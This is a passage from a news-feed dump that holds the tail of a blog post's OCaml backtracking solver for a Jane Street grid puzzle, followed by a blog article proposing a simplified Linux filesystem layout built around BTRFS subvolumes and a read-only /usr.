<span>let</span> <span>some_of_matrix</span> <span>matrix</span> <span>=</span>
  <span>let</span> <span>dimy</span> <span>=</span> <span>Array</span><span>.</span><span>length</span> <span>matrix</span> <span>in</span>
  <span>let</span> <span>dimx</span> <span>=</span> <span>Array</span><span>.</span><span>length</span> <span>matrix</span><span>.</span><span>(</span><span>0</span><span>)</span> <span>in</span>
  <span>let</span> <span>m</span> <span>=</span> <span>Array</span><span>.</span><span>make_matrix</span> <span>dimy</span> <span>dimx</span> <span>None</span> <span>in</span>
  <span>for</span> <span>y</span> <span>=</span> <span>0</span> <span>to</span> <span>(</span><span>dimy</span> <span>-</span> <span>1</span><span>)</span> <span>do</span>
    <span>for</span> <span>x</span> <span>=</span> <span>0</span> <span>to</span> <span>(</span><span>dimx</span> <span>-</span> <span>1</span><span>)</span> <span>do</span>
      <span>let</span> <span>z</span> <span>=</span> <span>matrix</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>in</span>
      <span>if</span> <span>z</span> <span>&lt;&gt;</span> <span>0</span> <span>then</span> <span>m</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>&lt;-</span> <span>Some</span> <span>z</span>
    <span>done</span>
  <span>done</span><span>;</span>
  <span>m</span>

<span>(***************** END helper functions *************************)</span>

<span>type</span> <span>puzzle</span> <span>=</span> <span>{</span>
  <span>left</span><span>:</span> <span>int</span> <span>array</span><span>;</span>
  <span>right</span><span>:</span> <span>int</span> <span>array</span><span>;</span>
  <span>bottom</span><span>:</span> <span>int</span> <span>array</span><span>;</span>
  <span>top</span><span>:</span> <span>int</span> <span>array</span><span>;</span>
  <span>grid</span><span>:</span> <span>int</span> <span>array</span> <span>array</span><span>;</span>
  <span>path</span><span>:</span> <span>int</span> <span>array</span><span>;</span>
  <span>valid_x</span><span>:</span> <span>int</span><span>;</span>        <span>(* A cell with a known value -- starting point *)</span>
  <span>valid_y</span><span>:</span> <span>int</span><span>;</span>        <span>(*   to check for connected region             *)</span>
<span>}</span>

<span>(* list of all values that will be used in a grid *)</span>
<span>let</span> <span>population</span> <span>=</span> <span>[</span><span>1</span><span>;</span><span>2</span><span>;</span><span>2</span><span>;</span><span>3</span><span>;</span><span>3</span><span>;</span><span>3</span><span>;</span><span>4</span><span>;</span><span>4</span><span>;</span><span>4</span><span>;</span><span>4</span><span>;</span><span>5</span><span>;</span><span>5</span><span>;</span><span>5</span><span>;</span><span>5</span><span>;</span><span>5</span><span>;</span><span>6</span><span>;</span><span>6</span><span>;</span><span>6</span><span>;</span><span>6</span><span>;</span><span>6</span><span>;</span><span>6</span><span>;</span><span>7</span><span>;</span><span>7</span><span>;</span><span>7</span><span>;</span><span>7</span><span>;</span><span>7</span><span>;</span><span>7</span><span>;</span><span>7</span><span>;</span>
                  <span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>;</span><span>0</span><span>]</span>

<span>let</span> <span>cell2xy</span> <span>cell</span> <span>=</span>
  <span>let</span> <span>y</span> <span>=</span> <span>cell</span> <span>/</span> <span>7</span> <span>in</span>
  <span>let</span> <span>x</span> <span>=</span> <span>cell</span> <span>mod</span> <span>7</span> <span>in</span>
  <span>(</span><span>y</span><span>,</span> <span>x</span><span>)</span>

<span>(* not more than 4 numbers in row and column and max 20 *)</span>
<span>let</span> <span>max4</span> <span>grid</span> <span>y</span> <span>x</span> <span>=</span>
  <span>let</span> <span>y_sum</span> <span>=</span> <span>ref</span> <span>0</span> <span>in</span>
  <span>let</span> <span>x_sum</span> <span>=</span> <span>ref</span> <span>0</span> <span>in</span>
  <span>let</span> <span>y_count</span> <span>=</span> <span>ref</span> <span>0</span> <span>in</span>
  <span>let</span> <span>x_count</span> <span>=</span> <span>ref</span> <span>0</span> <span>in</span>
  <span>for</span> <span>i</span> <span>=</span> <span>0</span> <span>to</span> <span>6</span> <span>do</span>
    <span>let</span> <span>yval</span> <span>=</span> <span>oval</span> <span>grid</span><span>.</span><span>(</span><span>i</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>in</span>
    <span>if</span> <span>yval</span> <span>&lt;&gt;</span> <span>0</span> <span>then</span> <span>begin</span>
      <span>incr</span> <span>y_count</span><span>;</span>
      <span>y_sum</span> <span>:=</span> <span>!</span><span>y_sum</span> <span>+</span> <span>yval</span>
    <span>end</span><span>;</span>
    <span>let</span> <span>xval</span> <span>=</span> <span>oval</span> <span>grid</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>i</span><span>)</span> <span>in</span>
    <span>if</span> <span>xval</span> <span>&lt;&gt;</span> <span>0</span> <span>then</span> <span>begin</span>
      <span>incr</span> <span>x_count</span><span>;</span>
      <span>x_sum</span> <span>:=</span> <span>!</span><span>x_sum</span> <span>+</span> <span>xval</span>
    <span>end</span>
  <span>done</span><span>;</span>
  <span>((</span><span>!</span><span>y_count</span> <span>&lt;</span> <span>4</span> <span>&amp;&amp;</span> <span>!</span><span>y_sum</span> <span>&lt;</span> <span>20</span><span>)</span> <span>||</span> <span>(</span><span>!</span><span>y_count</span> <span>=</span> <span>4</span> <span>&amp;&amp;</span> <span>!</span><span>y_sum</span> <span>=</span> <span>20</span><span>))</span> <span>&amp;&amp;</span>
  <span>((</span><span>!</span><span>x_count</span> <span>&lt;</span> <span>4</span> <span>&amp;&amp;</span> <span>!</span><span>x_sum</span> <span>&lt;</span> <span>20</span><span>)</span> <span>||</span> <span>(</span><span>!</span><span>x_count</span> <span>=</span> <span>4</span> <span>&amp;&amp;</span> <span>!</span><span>x_sum</span> <span>=</span> <span>20</span><span>))</span>

<span>let</span> <span>check_left</span> <span>p</span> <span>grid</span> <span>y</span> <span>x</span> <span>=</span>
  <span>let</span> <span>v</span> <span>=</span> <span>p</span><span>.</span><span>left</span><span>.</span><span>(</span><span>y</span><span>)</span> <span>in</span>
  <span>if</span> <span>v</span> <span>=</span> <span>0</span> <span>then</span> <span>true</span>
  <span>else</span> <span>let</span> <span>rec</span> <span>check</span> <span>i</span> <span>=</span>
         <span>match</span> <span>i</span> <span>=</span> <span>x</span><span>,</span> <span>grid</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>i</span><span>)</span> <span>with</span>
         <span>|</span> <span>true</span><span>,</span> <span>g</span> <span>when</span> <span>g</span> <span>=</span> <span>Some</span> <span>v</span> <span>||</span> <span>g</span> <span>=</span> <span>Some</span> <span>0</span> <span>-&gt;</span> <span>true</span>
         <span>|</span> <span>false</span><span>,</span> <span>g</span> <span>when</span> <span>g</span> <span>=</span> <span>Some</span> <span>0</span> <span>-&gt;</span> <span>check</span> <span>(</span><span>i</span> <span>+</span> <span>1</span><span>)</span>
         <span>|</span> <span>false</span><span>,</span> <span>g</span> <span>when</span> <span>g</span> <span>=</span> <span>Some</span> <span>v</span> <span>||</span> <span>g</span> <span>=</span> <span>None</span> <span>-&gt;</span> <span>true</span> 
         <span>|</span> <span>_</span><span>,</span> <span>_</span> <span>-&gt;</span> <span>false</span>
    <span>in</span> <span>check</span> <span>0</span>

<span>let</span> <span>check_right</span> <span>p</span> <span>grid</span> <span>y</span> <span>x</span> <span>=</span>
  <span>let</span> <span>v</span> <span>=</span> <span>p</span><span>.</span><span>right</span><span>.</span><span>(</span><span>y</span><span>)</span> <span>in</span>
  <span>if</span> <span>v</span> <span>=</span> <span>0</span> <span>then</span> <span>true</span>
  <span>else</span> <span>let</span> <span>rec</span> <span>check</span> <span>i</span> <span>=</span>
         <span>match</span> <span>i</span> <span>=</span> <span>x</span><span>,</span> <span>grid</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>i</span><span>)</span> <span>with</span>
         <span>|</span> <span>true</span><span>,</span> <span>g</span> <span>when</span> <span>g</span> <span>=</span> <span>Some</span> <span>v</span> <span>||</span> <span>g</span> <span>=</span> <span>Some</span> <span>0</span> <span>-&gt;</span> <span>true</span>
         <span>|</span> <span>false</span><span>,</span> <span>g</span> <span>when</span> <span>g</span> <span>=</span> <span>Some</span> <span>0</span> <span>-&gt;</span> <span>check</span> <span>(</span><span>i</span> <span>-</span> <span>1</span><span>)</span>
         <span>|</span> <span>false</span><span>,</span> <span>g</span> <span>when</span> <span>g</span> <span>=</span> <span>Some</span> <span>v</span> <span>||</span> <span>g</span> <span>=</span> <span>None</span> <span>-&gt;</span> <span>true</span> 
         <span>|</span> <span>_</span><span>,</span> <span>_</span> <span>-&gt;</span> <span>false</span>
    <span>in</span> <span>check</span> <span>6</span>

<span>let</span> <span>check_top</span> <span>p</span> <span>grid</span> <span>y</span> <span>x</span> <span>=</span>
  <span>let</span> <span>v</span> <span>=</span> <span>p</span><span>.</span><span>top</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>in</span>
  <span>if</span> <span>v</span> <span>=</span> <span>0</span> <span>then</span> <span>true</span>
  <span>else</span> <span>let</span> <span>rec</span> <span>check</span> <span>i</span> <span>=</span>
         <span>match</span> <span>i</span> <span>=</span> <span>y</span><span>,</span> <span>grid</span><span>.</span><span>(</span><span>i</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>with</span>
         <span>|</span> <span>true</span><span>,</span> <span>g</span> <span>when</span> <span>g</span> <span>=</span> <span>Some</span> <span>v</span> <span>||</span> <span>g</span> <span>=</span> <span>Some</span> <span>0</span> <span>-&gt;</span> <span>true</span>
         <span>|</span> <span>false</span><span>,</span> <span>g</span> <span>when</span> <span>g</span> <span>=</span> <span>Some</span> <span>0</span> <span>-&gt;</span> <span>check</span> <span>(</span><span>i</span> <span>+</span> <span>1</span><span>)</span>
         <span>|</span> <span>false</span><span>,</span> <span>g</span> <span>when</span> <span>g</span> <span>=</span> <span>Some</span> <span>v</span> <span>||</span> <span>g</span> <span>=</span> <span>None</span> <span>-&gt;</span> <span>true</span> 
         <span>|</span> <span>_</span><span>,</span> <span>_</span> <span>-&gt;</span> <span>false</span>
    <span>in</span> <span>check</span> <span>0</span>

<span>let</span> <span>check_bottom</span> <span>p</span> <span>grid</span> <span>y</span> <span>x</span> <span>=</span>
  <span>let</span> <span>v</span> <span>=</span> <span>p</span><span>.</span><span>bottom</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>in</span>
  <span>if</span> <span>v</span> <span>=</span> <span>0</span> <span>then</span> <span>true</span>
  <span>else</span> <span>let</span> <span>rec</span> <span>check</span> <span>i</span> <span>=</span>
         <span>match</span> <span>i</span> <span>=</span> <span>y</span><span>,</span> <span>grid</span><span>.</span><span>(</span><span>i</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>with</span>
         <span>|</span> <span>true</span><span>,</span> <span>g</span> <span>when</span> <span>g</span> <span>=</span> <span>Some</span> <span>v</span> <span>||</span> <span>g</span> <span>=</span> <span>Some</span> <span>0</span> <span>-&gt;</span> <span>true</span>
         <span>|</span> <span>false</span><span>,</span> <span>g</span> <span>when</span> <span>g</span> <span>=</span> <span>Some</span> <span>0</span> <span>-&gt;</span> <span>check</span> <span>(</span><span>i</span> <span>-</span> <span>1</span><span>)</span>
         <span>|</span> <span>false</span><span>,</span> <span>g</span> <span>when</span> <span>g</span> <span>=</span> <span>Some</span> <span>v</span> <span>||</span> <span>g</span> <span>=</span> <span>None</span> <span>-&gt;</span> <span>true</span> 
         <span>|</span> <span>_</span><span>,</span> <span>_</span> <span>-&gt;</span> <span>false</span>
    <span>in</span> <span>check</span> <span>6</span>

<span>(* check that at least one blank cell in a 2x2 sub matrix *)</span>
<span>let</span> <span>one_zero</span> <span>grid</span> <span>y</span> <span>x</span> <span>=</span>
  <span>if</span> <span>grid</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>Some</span> <span>0</span> <span>||</span> <span>y</span> <span>=</span> <span>0</span> <span>||</span> <span>x</span> <span>=</span> <span>0</span> <span>||</span> <span>y</span> <span>=</span> <span>6</span> <span>||</span> <span>x</span> <span>=</span> <span>6</span> <span>then</span> <span>true</span>
  <span>else</span> 
    <span>let</span> <span>e</span> <span>=</span> <span>grid</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>x</span><span>+</span><span>1</span><span>)</span> <span>in</span>
    <span>let</span> <span>w</span> <span>=</span> <span>grid</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>x</span><span>-</span><span>1</span><span>)</span> <span>in</span>
    <span>let</span> <span>n</span> <span>=</span> <span>grid</span><span>.</span><span>(</span><span>y</span><span>-</span><span>1</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>in</span>
    <span>let</span> <span>s</span> <span>=</span> <span>grid</span><span>.</span><span>(</span><span>y</span><span>+</span><span>1</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>in</span>
    <span>let</span> <span>ne</span> <span>=</span> <span>grid</span><span>.</span><span>(</span><span>y</span><span>-</span><span>1</span><span>)</span><span>.</span><span>(</span><span>x</span><span>+</span><span>1</span><span>)</span> <span>in</span>
    <span>let</span> <span>se</span> <span>=</span> <span>grid</span><span>.</span><span>(</span><span>y</span><span>+</span><span>1</span><span>)</span><span>.</span><span>(</span><span>x</span><span>+</span><span>1</span><span>)</span> <span>in</span>
    <span>let</span> <span>nw</span> <span>=</span> <span>grid</span><span>.</span><span>(</span><span>y</span><span>-</span><span>1</span><span>)</span><span>.</span><span>(</span><span>x</span><span>-</span><span>1</span><span>)</span> <span>in</span>
    <span>let</span> <span>sw</span> <span>=</span> <span>grid</span><span>.</span><span>(</span><span>y</span><span>+</span><span>1</span><span>)</span><span>.</span><span>(</span><span>x</span><span>-</span><span>1</span><span>)</span> <span>in</span>
    <span>(</span><span>e</span> <span>=</span> <span>None</span> <span>||</span> <span>e</span> <span>=</span> <span>Some</span> <span>0</span> <span>||</span> <span>n</span> <span>=</span> <span>None</span> <span>||</span> <span>n</span> <span>=</span> <span>Some</span> <span>0</span> <span>||</span> <span>ne</span> <span>=</span> <span>None</span> <span>||</span> <span>ne</span> <span>=</span> <span>Some</span> <span>0</span><span>)</span> <span>&amp;&amp;</span>
    <span>(</span><span>e</span> <span>=</span> <span>None</span> <span>||</span> <span>e</span> <span>=</span> <span>Some</span> <span>0</span> <span>||</span> <span>s</span> <span>=</span> <span>None</span> <span>||</span> <span>s</span> <span>=</span> <span>Some</span> <span>0</span> <span>||</span> <span>se</span> <span>=</span> <span>None</span> <span>||</span> <span>se</span> <span>=</span> <span>Some</span> <span>0</span><span>)</span> <span>&amp;&amp;</span>
    <span>(</span><span>w</span> <span>=</span> <span>None</span> <span>||</span> <span>w</span> <span>=</span> <span>Some</span> <span>0</span> <span>||</span> <span>n</span> <span>=</span> <span>None</span> <span>||</span> <span>n</span> <span>=</span> <span>Some</span> <span>0</span> <span>||</span> <span>nw</span> <span>=</span> <span>None</span> <span>||</span> <span>nw</span> <span>=</span> <span>Some</span> <span>0</span><span>)</span> <span>&amp;&amp;</span>
    <span>(</span><span>w</span> <span>=</span> <span>None</span> <span>||</span> <span>w</span> <span>=</span> <span>Some</span> <span>0</span> <span>||</span> <span>s</span> <span>=</span> <span>None</span> <span>||</span> <span>s</span> <span>=</span> <span>Some</span> <span>0</span> <span>||</span> <span>sw</span> <span>=</span> <span>None</span> <span>||</span> <span>sw</span> <span>=</span> <span>Some</span> <span>0</span><span>)</span>

<span>let</span> <span>connected</span> <span>grid</span> <span>y</span> <span>x</span> <span>=</span>
  <span>let</span> <span>()</span> <span>=</span> <span>assert</span> <span>(</span><span>grid</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>&lt;&gt;</span> <span>Some</span> <span>0</span><span>)</span> <span>in</span>
  <span>let</span> <span>mark</span> <span>=</span> <span>Array</span><span>.</span><span>make_matrix</span> <span>7</span> <span>7</span> <span>true</span>  <span>in</span>
  <span>let</span> <span>count</span> <span>=</span> <span>ref</span> <span>0</span> <span>in</span>
  <span>let</span> <span>rec</span> <span>flood</span> <span>y</span> <span>x</span> <span>=</span> 
    <span>incr</span> <span>count</span><span>;</span>
    <span>mark</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>&lt;-</span> <span>false</span><span>;</span>
    <span>if</span> <span>y</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>grid</span><span>.</span><span>(</span><span>y</span><span>-</span><span>1</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>&lt;&gt;</span> <span>Some</span> <span>0</span> <span>&amp;&amp;</span> <span>mark</span><span>.</span><span>(</span><span>y</span><span>-</span><span>1</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>then</span> <span>flood</span> <span>(</span><span>y</span><span>-</span><span>1</span><span>)</span> <span>x</span><span>;</span>  <span>(* N *)</span>
    <span>if</span> <span>y</span> <span>&lt;</span> <span>6</span> <span>&amp;&amp;</span> <span>grid</span><span>.</span><span>(</span><span>y</span><span>+</span><span>1</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>&lt;&gt;</span> <span>Some</span> <span>0</span> <span>&amp;&amp;</span> <span>mark</span><span>.</span><span>(</span><span>y</span><span>+</span><span>1</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>then</span> <span>flood</span> <span>(</span><span>y</span><span>+</span><span>1</span><span>)</span> <span>x</span><span>;</span>  <span>(* S *)</span>
    <span>if</span> <span>x</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>grid</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>x</span><span>-</span><span>1</span><span>)</span> <span>&lt;&gt;</span> <span>Some</span> <span>0</span> <span>&amp;&amp;</span> <span>mark</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>x</span><span>-</span><span>1</span><span>)</span> <span>then</span> <span>flood</span> <span>y</span> <span>(</span><span>x</span><span>-</span><span>1</span><span>);</span>  <span>(* W *)</span>
    <span>if</span> <span>x</span> <span>&lt;</span> <span>6</span> <span>&amp;&amp;</span> <span>grid</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>x</span><span>+</span><span>1</span><span>)</span> <span>&lt;&gt;</span> <span>Some</span> <span>0</span> <span>&amp;&amp;</span> <span>mark</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>x</span><span>+</span><span>1</span><span>)</span> <span>then</span> <span>flood</span> <span>y</span> <span>(</span><span>x</span><span>+</span><span>1</span><span>);</span>  <span>(* E *)</span>
  <span>in</span>
  <span>let</span> <span>()</span> <span>=</span> <span>flood</span> <span>y</span> <span>x</span> <span>in</span>
  <span>!</span><span>count</span> <span>&gt;=</span> <span>28</span>  <span>(* 28 if all items on board - else more*)</span>

<span>let</span> <span>isvalid</span> <span>p</span> <span>grid</span> <span>step</span> <span>cell</span> <span>y</span> <span>x</span> <span>=</span>
  <span>max4</span> <span>grid</span> <span>y</span> <span>x</span> <span>&amp;&amp;</span>
  <span>check_left</span> <span>p</span> <span>grid</span> <span>y</span> <span>x</span> <span>&amp;&amp;</span>
  <span>check_right</span> <span>p</span> <span>grid</span> <span>y</span> <span>x</span> <span>&amp;&amp;</span>
  <span>check_top</span> <span>p</span> <span>grid</span> <span>y</span> <span>x</span> <span>&amp;&amp;</span>
  <span>check_bottom</span> <span>p</span> <span>grid</span> <span>y</span> <span>x</span> <span>&amp;&amp;</span>
  <span>one_zero</span> <span>grid</span> <span>y</span> <span>x</span> <span>&amp;&amp;</span>
  <span>connected</span> <span>grid</span> <span>p</span><span>.</span><span>valid_y</span> <span>p</span><span>.</span><span>valid_x</span>
 
<span>(* remove already used numbers from full population *)</span></code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://willemhoek.com/b/howto-solve-jane-street-puzzle-dec-2020-backtracking-with-ocaml">https://willemhoek.com/b/howto-solve-jane-street-puzzle-dec-2020-backtracking-with-ocaml</a></em></p>]]>
            </description>
            <link>https://willemhoek.com/b/howto-solve-jane-street-puzzle-dec-2020-backtracking-with-ocaml</link>
            <guid isPermaLink="false">hacker-news-small-sites-25713770</guid>
            <pubDate>Sun, 10 Jan 2021 11:50:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Revamping the Linux file system layout]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25713757">thread link</a>) | @pelasaco
<br/>
January 10, 2021 | https://lnussel.github.io/2020/12/16/fslayout/ | <a href="https://web.archive.org/web/*/https://lnussel.github.io/2020/12/16/fslayout/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <header>
        
        
        

        

        

        
        <p><a href="https://github.com/lnussel">View My GitHub Profile</a></p>
        

        
      </header>
      <section>

      <small>16 December 2020</small>


<p>by </p>

<h2 id="intro">Intro</h2>

<p>A traditional Linux file system tree in the root file system has
quite a number of directories with special purpose, documented in
the <a href="https://refspecs.linuxfoundation.org/FHS_3.0/fhs/index.html">Filesystem Hierarchy Standard
(FHS)</a>.
An operating system installation by default populates most of those
directories with differerent kinds of files, e.g. by means of a
package manager. This article analyzes the situation and proposes a
radical simplification.</p>

<h2 id="traditional-file-system-tree">Traditional file system tree</h2>

<p>The following diagram shows such a traditional file system tree as used by a
default openSUSE installation on a classical filesystem such as ext4 in 2020:</p>

<p><img src="https://lnussel.github.io/images/2020-12-16-fslayout/tree1.png" alt="tree1" title="traditional filesystem tree"></p>

<p>The colors visualize different kinds of files while gradients indicate a mix of
types on the same file system.</p>

<p>The file types according to color are the following:</p>
<ul>
  <li><img src="https://lnussel.github.io/images/2020-12-16-fslayout/config.png" alt="legend" title="configuration">
These are files that are usually written once by the admin or a
config tool to configure operating system features or services and,
once that’s done, are only read. Such files are traditionally placed in <code>/etc</code>.</li>
  <li><img src="https://lnussel.github.io/images/2020-12-16-fslayout/data.png" alt="legend" title="data"> Objects created by
users or services, such as documents, images, videos or personal
files of users. For services, these are e.g. databases or caches. The
operating system may also produce data, such as log files. Data is
both read and written frequently. Files are located below
<code>/var</code>, for example <code>/var/log</code> or
<code>/var/cache</code>. <code>/var/lib</code> is an application-specific hierarchy
where anything can be stored.</li>
  <li><img src="https://lnussel.github.io/images/2020-12-16-fslayout/boot.png" alt="legend" title="boot"> Boot
loader files, kernels and initial ramdisks.</li>
  <li><img src="https://lnussel.github.io/images/2020-12-16-fslayout/os.png" alt="legend" title="operating system">
The OS is shipped as packages or image by the operating system vendor. It is
only written to during installation or upgrade of the system, and otherwise
considered read-only. These files would be overwritten on updates
of OS components. In a traditional system, these are installed in
root filesystem <code>/</code> as well as <code>/usr</code>, but also in <code>/etc</code>,
<code>/srv</code>, <code>/opt</code> and <code>/var</code>, mixing with user or service created
files.</li>
  <li><img src="https://lnussel.github.io/images/2020-12-16-fslayout/tmp.png" alt="legend" title="virtual"> For
example, anything on tmpfs, but also virtual file systems that are
kernel interfaces, e.g. <code>/proc</code>, <code>/sys</code>, <code>/dev</code> etc. The content is
lost after reboot, or managed by the kernel anyways.</li>
</ul>

<p>An example for a mixed file type hierarchy is <code>/etc</code>. The operating system ships files that
are not actually meant to be modified, like <code>/etc/profile</code>, or worse,
<code>/etc/ld.so.cache</code>, which isn’t even a config file at all.
A typical workstation mounts <code>/home</code> from a separate partition. This is
visualized by the puzzle piece. Also, the EFI boot partition is
mounted onto <code>/boot/efi</code>.</p>

<h2 id="btrfs-snapshots-and-transactional-mode">BTRFS, snapshots and transactional mode</h2>

<p>With the introduction of BTRFS, the operating system gained the
ability to take snapshots and roll back the system in case of
troublesome updates. So it was required to define what should be
part of a snapshot and what not. User documents for example must not be rolled
back. Furthermore, databases can’t really be snapshotted nor rolled back by the OS as
the structure is application-specific and follows its own transaction
mechanism. The usual configuration files in <code>/etc</code> need to be rolled
back though, as some are tied to the software version installed.</p>

<p>That lead to the separation of the filesystem into five subvolumes, namely
<code>/root</code>, <code>/var</code>, <code>/srv</code>, <code>/opt</code> and <code>/usr/local</code>. <code>/tmp</code> now
usually even resides on tmpfs. That means the operating system’s
package manager cannot really install files in these directories
anymore. Otherwise, a rollback would lead to an inconsistent package database.
So the number of locations with mixed OS files and data got reduced at the cost
of more subvolumes.</p>

<p>The following diagram shows a typical file system tree a default
openSUSE installation on BTRFS in 2020:</p>

<p><img src="https://lnussel.github.io/images/2020-12-16-fslayout/tree2.png" alt="tree2" title="introduction of btrfs,
snapshots and transactional mode"></p>

<p>In transactional mode (e.g. MicroOS), there’s a further complication. The green
parts of the tree are read-only at runtime. So the writable parts of <code>/etc</code> is
actually located below <code>/var</code>. An overlayfs makes those files appear in
<code>/etc/</code>.</p>

<h2 id="grouping-and-separating-by-data-type">Grouping and separating by data type</h2>

<p>The data on the purple partitions is actually of a similar kind.
Is there any gain in having separate partitions or subvolumes for
these by default? Probably not. So, in order to reduce the amount of subvolumes
again, they could be moved into the <code>/var</code> volume, for example <code>/var/home</code>,
<code>/var/srv</code>, and so on, with the original directory as symlink. If the workload is
known exactly, an admin could still make an educated decision to have separate
partitions.</p>

<p><img src="https://lnussel.github.io/images/2020-12-16-fslayout/tree3.png" alt="tree3" title="one var"></p>

<p>With this simplification, only <code>/boot</code> and <code>/etc</code> still mix OS files with other
types.</p>

<h3 id="boot-files">Boot files</h3>

<p>The initramfs is generated by a script, triggered by package installation. The
boot loader files (usually grub2) are managed via scripts. By moving the kernel
image out of <code>/boot</code> and into the operating system space, e.g. <code>/usr/lib/linux</code>,
<code>/boot</code> would become entirely managed by scripts. Since modern system have an
EFI boot partition anyway, that boot partition can be mounted right onto
<code>/boot</code>.</p>

<p><img src="https://lnussel.github.io/images/2020-12-16-fslayout/tree9.png" alt="tree9" title="separate /boot"></p>

<h3 id="config-files">Config files</h3>

<p>There are already ongoing efforts to move all files that
are not actually meant to be edited, or only serve as default, from <code>/etc</code> to
<code>/usr</code>, for example
<a href="https://en.opensuse.org/openSUSE:Packaging_UsrEtc"><code>/usr/etc</code></a>.</p>

<p>So then, /etc would actually only contain locally generated configuration (e.g. by
the admin). Therefore, it could actually be separated from the rest of the
operating system and the OS tree can become read-only.</p>

<p>For MicroOS, that would mean that, when there are no longer OS files in <code>/etc</code>,
the lower directory (of the overlayfs) would basically be empty, therefore the need for an overlay
vanishes and <code>/etc</code> can become its own (sub)volume without further tricks.</p>

<p><img src="https://lnussel.github.io/images/2020-12-16-fslayout/tree10.png" alt="tree10" title="separate /etc"></p>

<p>This new tree no longer has any directories with mixed file types.</p>

<h2 id="usrmerge">UsrMerge</h2>

<p>What’s left is an operating system that owns the root file
system and <code>/usr</code>. The split between <code>/</code> and <code>/usr</code> is actually
a legacy concept that no longer applies. The initramfs can mount
all partitions just fine, so there’s no need to have operating
system files directly in <code>/</code> anymore. Other vendors already merged
all operating system files into
<a href="https://fedoraproject.org/wiki/Features/UsrMove"><code>/usr</code></a> to further
simplify things:</p>

<p><img src="https://lnussel.github.io/images/2020-12-16-fslayout/tree7.png" alt="tree7" title="usr on /"></p>

<h2 id="-without-os"><code>/</code> without OS</h2>

<p>Now there’s basically nothing left directly within <code>/</code> that needs to be shipped by the OS,
just a bunch of mount points and symlinks that point to <code>/var</code> or <code>/usr</code>. Since
the operating system’s package manager has no other business outside of <code>/usr</code>,
the actual root directory could be assigned to the <code>/etc/</code> volume, which is to
say, <code>/</code> and <code>/etc</code> are located on one subvolume (same <code>stat -c %d</code> value).</p>

<p><img src="https://lnussel.github.io/images/2020-12-16-fslayout/tree6.png" alt="tree6" title="/ on /etc partition"></p>

<h2 id="potential">Potential</h2>

<p>With that clear separation of file types an OS tree limited to <code>/usr</code>
there’s potential to use the system in new ways</p>

<ul>
  <li>It does not matter whether <code>/usr</code> is actually mounted from a
static image, network or locally installed and updated by a package manager,
i.e. both the transactional update mechanism as of today, as well as an A/B
scheme would be possible, even in parallel.</li>
  <li>The entire <code>/usr</code> tree as a whole could be replaced atomically at runtime
without reboot.</li>
  <li>an overlayfs for <code>/etc</code> is no longer needed in transactional mode</li>
  <li>Config files can and have to be snapshotted independently of the OS tree.</li>
  <li>A system can boot with empty <code>/etc</code> and <code>/var</code> just based on
operating system defaults coming from <code>/usr</code>. Resetting a system
can be done by erasing those directories.</li>
  <li>Stateless systems (including e.g. salt managed ones) could be built
by mounting <code>/</code>, including <code>/etc</code>, as tmpfs. That may include <code>/var</code>,
or could mount it from disk to still have data/containers on disk.</li>
  <li>Since the files in <code>/usr</code> are read-only, independent of any
configuration, such a tree created from packages could be
used as shared runtime for containers or apps (e.g. flatpak).</li>
  <li><code>/boot</code> on a trivial file system can remove the need for very
complex boot loaders like grub. It also means the boot loader does
not have to decrypt the disk to load the kernel in case of full
disk encryption.</li>
</ul>

<h2 id="consequences-and-todo">Consequences and TODO</h2>

<ul>
  <li>The operating system packages have to be limited to ever only ship
files in <code>/usr</code>. Anything else would be out of scope, i.e. the UsrMerge proposal has to
be implemented.</li>
  <li>package scriptlets (%post, etc.) can no longer modify anything outside <code>/usr</code>,
including <code>/etc</code>. A concept for config and data migration scripts would be
needed, i.e. similar to how web applications migrate SQL databases back and
forth on upgrades or downgrades.</li>
  <li>A new application has to manage <code>/boot</code>, ideally according to the
